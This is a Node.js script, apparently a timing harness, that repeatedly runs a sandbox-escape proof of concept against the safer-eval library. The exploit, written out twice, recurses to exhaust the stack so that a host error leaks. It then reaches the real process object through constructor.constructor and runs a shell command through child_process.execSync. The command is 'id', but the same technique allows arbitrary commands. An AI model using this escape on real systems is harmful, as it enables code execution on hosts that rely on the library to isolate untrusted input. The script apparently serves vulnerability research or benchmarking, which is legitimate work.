
    var arguments = process.argv;
    if (arguments.length == 3) {
        type = arguments[2];
        var time1 = process.hrtime.bigint();
        for (var i = 0; i < 100; i++){
        try{
               const saferEval = require('safer-eval');
           const theFunction = function () {
               const f = Buffer.prototype.write;
               const ft = {
                     length: 10,
                     utf8Write(){
           
                           }
                   };
               function r(i){
                     var x = 0;
                     try{
                             x = r(i);
                           }catch(e){}
                     if(typeof(x)!=='number')
                         return x;
                     if(x!==i)
                         return x+1;
                     try{
                             f.call(ft);
                           }catch(e){
                                   return e;
                                 }
                     return null;
                   }
               var i=1;
               while(1){
                     try{
                             i=r(i).constructor.constructor("return process")();
                             break;
                           }catch(x){
                                   i++;
                                 }
                   }
               return i.mainModule.require("child_process").execSync("id").toString()
           };
           const untrusted = `(${theFunction})()`;
           
           saferEval(untrusted);
           
 } catch(e){}
        }      
        var time2 = process.hrtime.bigint();
        console.log(`${type}_time: ${time2-time1}`); 
        require("fs").writeFileSync(`${type}_time`, (time2-time1).toString()); 
    } else{
       const saferEval = require('safer-eval');
   const theFunction = function () {
       const f = Buffer.prototype.write;
       const ft = {
             length: 10,
             utf8Write(){
   
                   }
           };
       function r(i){
             var x = 0;
             try{
                     x = r(i);
                   }catch(e){}
             if(typeof(x)!=='number')
                 return x;
             if(x!==i)
                 return x+1;
             try{
                     f.call(ft);
                   }catch(e){
                           return e;
                         }
             return null;
           }
       var i=1;
       while(1){
             try{
                     i=r(i).constructor.constructor("return process")();
                     break;
                   }catch(x){
                           i++;
                         }
           }
       return i.mainModule.require("child_process").execSync("id").toString()
   };
   const untrusted = `(${theFunction})()`;
   
   saferEval(untrusted);
   

    }
